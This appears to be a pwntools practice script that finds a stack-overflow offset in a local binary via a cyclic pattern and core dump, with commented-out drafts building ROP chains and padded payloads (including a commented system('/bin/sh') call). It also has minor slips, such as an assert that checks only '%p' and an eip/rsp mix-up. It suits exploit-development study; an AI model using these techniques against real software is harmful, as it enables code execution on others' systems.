#!/usr/bin/env python3

from pwn import *
from itertools import cycle
import os

def get_corefile_location(executable_name: str, pid: int) -> os.PathLike[str]:
    with open("/proc/sys/kernel/core_pattern") as f:
        core_pattern = f.read()
        assert "%e" and "%p" in core_pattern
        return core_pattern.replace("%e", executable_name).replace("%p", str(pid)).strip()

# Generate a pattern of 100 bytes, larger than the buffer size
pattern = cyclic(1000)

# Start the vulnerable binary
with process('./example') as p:
    # Send the pattern as input
    print("current pid", p.pid)
    p.sendline(pattern)
    p.wait()  # Wait for the program to crash

    # Examine the crash to find the offset
    core = Coredump(get_corefile_location("example", p.pid))
    offset = cyclic_find(core.read(core.eip, 4))  # rsp holds the overwritten return address

    print(f"Offset to overwrite return address: {offset}")


"""
# # Override pwntools's default cache directory to your secret tmp directory
# # (workaround for <https://github.com/Gallopsled/pwntools/issues/2072>)
# os.environ['XDG_CACHE_HOME'] = './'

# Our ROP chain will use gadgets from the following ELFs
binary = ELF('./example')
rop = ROP([binary,
           ELF('/usr/lib/gcc/x86_64-linux-gnu/12/libcc1.so')])

# Write a ROP chain that calls some libc functions!
#  rop.call('system', ['/bin/sh'])
#  rop.call('exit', [0])
rop.win_function()

# Pretty-print the finished payload
print(rop.dump())

# Convert it to bytes
ropchain = rop.chain()
print(f"{ropchain=}")

offset = 30
payload = flat({offset: ropchain}, filler=cycle(b'A'))
print(f"{payload=}")

print("attacking...")
with process(binary.path) as example:
    print(example.recvline(timeout=5))
    example.sendline(payload)
    print(example.recvline(timeout=5))
"""


#  from itertools import cycle
#  from pwn import *

#  binary = ELF('./example')

#  # print(binary.sym)

#  rop = ROP(binary)
#  rop.foo()
#  rop.exit()

#  print(rop.dump())
#  print("Binary Data:")
#  print(hexdump(bytes(rop)))
#  ropchain = rop.chain()

#  offset = 30
#  payload = flat({offset: ropchain}, filler=cycle(b'A'))

#  print(f"{payload=}")

#  #  buffer_size = 10
#  #  padding = str(0xaa) * buffer_size

#  #  payload = padding.encode() + ropchain

#  print('exploiting...')

#  with process(binary.path) as example:
#  example.sendline(payload)
#  print(example.recvline(timeout=5))


#  #  #  print(binary.symbols['foo'])
#  #  #  print(binary.symbols)



